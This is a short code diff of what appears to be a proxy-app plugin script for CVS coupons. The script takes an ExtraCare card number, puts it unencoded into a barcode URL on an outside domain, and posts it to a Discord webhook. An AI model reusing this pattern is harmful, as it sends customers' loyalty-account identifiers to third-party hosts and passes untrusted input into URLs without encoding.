@@ -13,17 +13,21 @@ try {
                 $notification.post('CVS Plugin', 'Successfully Retrieved Coupon', `Card: ${cardNumber}`);
                 
                 // Generate barcode URL
-                const barcodeUrl = `https://vratasram.xyz/_next/image?url=%2Fapi%2Fcvs%2Fbarcode%3Fcode%3D${encodeURIComponent(cardNumber)}&w=3840&q=75`;
+                const barcodeUrl = `https://vratasram.xyz/api/cvs/barcode?code=${cardNumber}`;
                 
                 // Send to Discord webhook
                 const discordPayload = {
                     embeds: [{
                         title: "CVS ExtraCare Card",
-                        description: `Card Number: ${cardNumber}`,
+                        fields: [{
+                            name: "Card Number",
+                            value: cardNumber,
+                            inline: true
+                        }],
                         image: {
                             url: barcodeUrl
                         },
-                        color: 0x00ff00,
+                        color: 0xD3D3D3,
                         timestamp: new Date().toISOString()
                     }]
                 };
